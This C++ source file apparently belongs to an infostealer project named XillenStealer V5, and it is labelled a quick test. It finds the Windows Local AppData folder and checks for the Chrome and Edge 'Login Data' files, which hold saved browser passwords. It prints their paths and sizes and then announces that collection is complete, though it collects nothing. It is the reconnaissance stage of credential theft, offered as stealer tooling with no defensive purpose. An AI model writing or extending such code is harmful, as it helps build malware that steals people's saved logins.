#include <windows.h>
#include <shlobj.h>
#include <iostream>
#include <filesystem>

int main() {
    std::cout << "======================================\n";
    std::cout << "XILLENSTEALER V5 - QUICK TEST\n";
    std::cout << "======================================\n\n";
    
    char path[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, path);
    
    std::cout << "[*] Checking browsers...\n\n";
    
    std::string chrome = std::string(path) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
    std::string edge = std::string(path) + "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
    
    if (std::filesystem::exists(chrome)) {
        std::cout << "[+] CHROME FOUND!\n";
        std::cout << "    Path: " << chrome << "\n";
        std::cout << "    Size: " << std::filesystem::file_size(chrome) << " bytes\n\n";
    }
    
    if (std::filesystem::exists(edge)) {
        std::cout << "[+] EDGE FOUND!\n";
        std::cout << "    Path: " << edge << "\n";
        std::cout << "    Size: " << std::filesystem::file_size(edge) << " bytes\n\n";
    }
    
    std::cout << "[+] Collection complete!\n";
    std::cout << "\nPress Enter to exit...\n";
    std::cin.get();
    
    return 0;
}
